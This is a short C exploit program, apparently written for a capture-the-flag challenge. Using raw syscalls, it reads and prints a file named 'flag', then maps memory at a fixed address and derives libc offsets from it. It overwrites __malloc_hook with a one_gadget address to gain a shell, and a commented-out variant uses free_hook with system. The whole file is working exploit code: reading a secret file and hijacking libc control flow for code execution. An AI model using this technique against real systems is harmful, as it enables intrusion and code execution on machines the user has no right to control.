#include <stdint.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/uio.h>
//extern char flag_path[] __attribute__((visibility("hidden")));
//extern char maps_path[] __attribute__((visibility("hidden")));
//extern char shell_path[] __attribute__((visibility("hidden")));
//__attribute__((section(".text"))) char qwe[] = "qweqwe";
__attribute__((aligned(1))) static char flag_path[] = "flag";
void _start()
{
    char buf[0x400];
    int fd = syscall(__NR_openat, AT_FDCWD, flag_path, 0, 0);
    syscall(__NR_read, fd, buf, sizeof(buf));
    syscall(__NR_write, 1, buf, sizeof(buf));
    uint64_t map = syscall(__NR_mmap, 0x4000000000, 0x200000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    uint64_t libc = map + 0x2464000;
    //uint64_t *freehook = libc + 0x3ed8e8;
    uint64_t *mallochook = libc + 0x3ebc30;
    uint64_t one = libc + 0x10a41c; // one
    //*freehook = system;
    *mallochook = one;
    //syscall(__NR_read, 0, buf, 2);
    syscall(__NR_writev, 0, 2, 3);
}
